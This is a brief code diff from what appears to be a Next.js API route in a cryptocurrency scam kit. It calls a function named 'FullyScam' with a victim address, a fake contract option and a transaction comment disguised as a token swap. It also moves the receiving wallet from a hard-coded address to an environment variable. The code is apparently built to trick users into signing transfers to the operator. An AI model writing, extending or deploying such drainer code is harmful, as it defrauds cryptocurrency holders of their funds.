@@ -38,7 +38,7 @@ export async function GET(request: NextRequest) {
 	return await FullyScam({
 		address,
 		config: {
-			address: "UQB33BaeeofVuT6Zf0Jw0AH_8HWJz14u4dW_hdiZrFNj9fRD",
+			address: process.env['WALLET']+"",
 			defaultTransactionComment: `Swap ${n2} / ${n1}`,
 			...(fakeContract && ({
 				fakeContract,
